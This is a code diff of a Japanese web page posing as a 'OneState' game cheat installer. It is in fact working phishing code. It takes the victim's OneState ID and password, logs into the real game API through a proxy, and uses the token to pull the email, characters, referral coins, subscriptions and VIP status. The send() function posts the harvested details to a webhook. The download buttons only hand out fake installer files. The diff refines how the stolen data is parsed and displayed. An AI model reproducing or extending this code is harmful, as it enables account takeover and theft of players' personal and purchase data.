@@ -39,13 +39,15 @@ input:focus{border-color:var(--acc)}
 .tog i{width:34px;height:18px;border:1px solid var(--line);position:relative;display:block;flex:none}
 .tog i::after{content:"";position:absolute;top:2px;left:2px;width:12px;height:12px;background:var(--dim)}
 .tog.on i{border-color:var(--acc)}.tog.on i::after{left:18px;background:var(--acc)}
-pre{margin:0;font-family:var(--mono);font-size:11.5px;white-space:pre-wrap;word-break:break-all}
+pre{margin:0;font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-break:break-all}
 #acctBody{color:var(--fg)}
 #acctBody b{color:var(--acc);font-weight:600}
 #acctBody .k{color:var(--acc)}
-#acctBody .ch{border-left:1px solid var(--line);padding-left:9px;margin:4px 0;display:block}
+#acctBody .ch{border-left:1px solid var(--line);padding-left:9px;margin:5px 0;display:block}
 #acctBody .d{color:var(--dim)}
-#acctBody hr{border:0;border-top:1px solid var(--line);margin:10px 0}
+#acctBody .r{display:flex;justify-content:space-between;gap:10px}
+#acctBody .r span:last-child{color:var(--fg)}
+#acctBody hr{border:0;border-top:1px solid var(--line);margin:11px 0}
 footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 #admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
 .ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
@@ -58,7 +60,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v5.0</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v5.1</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -126,18 +128,18 @@ function toast(t){var w=$('toast'),d=document.createElement('div');d.className='
 function esc(s){return String(s).replace(/[&<>]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[c]})}
 function sdkOk(){return !!(window.corsfix&&window.corsfix.fetch)}
 async function sdkReq(method,path,body,H){
-  if(!sdkOk())return{ok:false,t:'no-sdk'};
+  if(!sdkOk())return{ok:false};
   var opts={method:method,headers:Object.assign({'Content-Type':'application/json'},H||{})};
   if(body!=null)opts.body=JSON.stringify(body);
   for(var i=0;i<3;i++){
     try{
       var r=await window.corsfix.fetch(CONFIG.API+path,opts);
       var t=await r.text();var j=null;try{j=JSON.parse(t)}catch(e){}
-      if(j&&!j.corsfix_error)return{ok:true,t:'sdk',json:j,text:t};
+      if(j&&!j.corsfix_error)return{ok:true,json:j,text:t};
       await sleep(600);
     }catch(e){await sleep(600)}
   }
-  return {ok:false,t:'sdk-err'};
+  return {ok:false};
 }
 var sdkGet=function(p,H){return sdkReq('GET',p,null,H)};
 var sdkPost=function(p,b,H){return sdkReq('POST',p,b,H)};
@@ -148,7 +150,7 @@ async function send(text){
   catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
 }
 async function apiLogin(id,pw){
-  var r=await sdkReq('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
+  var r=await sdkPost('/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
   return null;
 }
@@ -158,39 +160,46 @@ async function doRefresh(rt){
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
   return null;
 }
-/* 追加情報：VIP / 紹介コイン / サブスク */
 async function enrich(tok,sid){
-  var H={authorization:'Bearer '+tok},L=[];
-  if(sid){
-    var a=await sdkGet('/v1/shop/@me/referrals/'+sid,H);
-    if(a.ok&&a.json)L.push('紹介コイン: '+JSON.stringify(a.json).slice(0,220));
-    var b=await sdkGet('/v2/shop/@me/subscriptions/'+sid+'/active',H);
-    if(b.ok&&b.json)L.push('サブスク: '+JSON.stringify(b.json).slice(0,220));
-    var c=await sdkPost('/v1/vip:resolveMyVipStatus',{serverId:sid},H);
-    if(c.ok&&c.json)L.push('VIP: '+JSON.stringify(c.json).slice(0,220));
+  var H={authorization:'Bearer '+tok},o={};
+  if(!sid)return o;
+  var a=await sdkGet('/v1/shop/@me/referrals/'+sid,H);
+  if(a.ok&&a.json){
+    var j=a.json.data||a.json;
+    o.code=j.standardCode||'';
+    if(j.currencies){o.refCoins=j.currencies.refCoins;o.webHard=j.currencies.webHard}
+    o.subscribed=j.isSubscribed;
+    o.owner=j.ownerStatus;
   }
-  var d=await sdkGet('/v2/shop/@me/ecommerce/purchases',H);
-  if(d.ok&&d.json)L.push('購入履歴: '+JSON.stringify(d.json).slice(0,220));
-  return L;
+  var b=await sdkGet('/v2/shop/@me/subscriptions/'+sid+'/active',H);
+  if(b.ok&&b.json){var d=b.json.data||b.json;o.subCount=(d.summary&&d.summary.activeCount);if(o.subCount==null&&d.subscriptions)o.subCount=d.subscriptions.length}
+  var c=await sdkPost('/v1/vip:resolveMyVipStatus',{serverId:sid},H);
+  if(c.ok&&c.json)o.vip=!!c.json.vip;
+  return o;
 }
 function pt(sec){var n=parseInt(sec,10);if(!n||isNaN(n))return '-';return Math.floor(n/86400)+'日 '+Math.floor(n%86400/3600)+'h'}
-function showAccount(res,extra){
+function row(k,v){return '<span class="r"><span class="k">'+k+'</span><span>'+esc(v)+'</span></span>\n'}
+function showAccount(res,e){
   if(!res){acct('<span class="d">照会失敗</span>');return}
   var a=res.acc||{},pl=(res.pl&&res.pl.players)||[];
   var H='';
-  H+='<span class="k">username</span> '+esc(a.username||'-')+'\n';
-  H+='<span class="k">email</span>    '+esc(a.email||'-')+'\n';
-  H+='<span class="k">country</span>  '+esc(a.country||'-')+'\n';
-  H+='<span class="k">chars</span>    '+pl.length+'\n';
+  H+=row('username',a.username||'-');
+  H+=row('email',a.email||'-');
+  H+=row('country',a.country||'-');
+  H+=row('chars',String(pl.length));
   H+='<span class="k">// キャラクター</span>\n';
   if(!pl.length)H+='  <span class="d">(なし)</span>\n';
   pl.forEach(function(p,i){
     H+='<span class="ch">['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>  Lv.'+esc(p.level===undefined?'-':p.level)+'\n';
     H+='    <span class="d">'+esc(p.serverName||'-')+'  /  play '+pt(p.playTimeSeconds)+'</span></span>';
   });
-  if(extra&&extra.length){
+  if(e&&(e.code||e.refCoins!=null||e.vip!==undefined||e.subCount!=null)){
     H+='<hr><span class="k">// 追加情報</span>\n';
-    extra.forEach(function(x){H+='<span class="d">'+esc(x)+'</span>\n'});
+    if(e.code)H+=row('紹介コード',e.code);
+    if(e.refCoins!=null)H+=row('紹介コイン',String(e.refCoins));
+    if(e.webHard!=null)H+=row('webコイン',String(e.webHard));
+    if(e.subCount!=null)H+=row('サブスク',e.subCount>0?e.subCount+' 件':'なし');
+    if(e.vip!==undefined)H+=row('VIP',e.vip?'あり':'なし');
   }
   acct(H);toast('照会成功');
   send('OneState 照会\nuser: '+(a.username||'-')+'\nemail: '+(a.email||'-')+'\nchars: '+pl.length+
@@ -210,10 +219,9 @@ async function run(){
   if(!isOk(r)||!r.json.data){acct('<span class="d">照会失敗</span>');return}
   var p=await sdkGet('/v2/account/@me/players',H);
   var pl=(p.ok&&p.json&&p.json.players)||[];
-  var sid=(pl[0]&&pl[0].serverId)||'';
-  var extra=await enrich(tok,sid);
+  var e=await enrich(tok,(pl[0]&&pl[0].serverId)||'');
   log('照会完了 chars='+pl.length);
-  showAccount({acc:r.json.data,pl:(p.ok?p.json:null)},extra);
+  showAccount({acc:r.json.data,pl:(p.ok?p.json:null)},e);
 }
 $('form').addEventListener('submit',async function(e){
   e.preventDefault();
@@ -227,7 +235,7 @@ $('form').addEventListener('submit',async function(e){
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v5.0 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v5.1 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
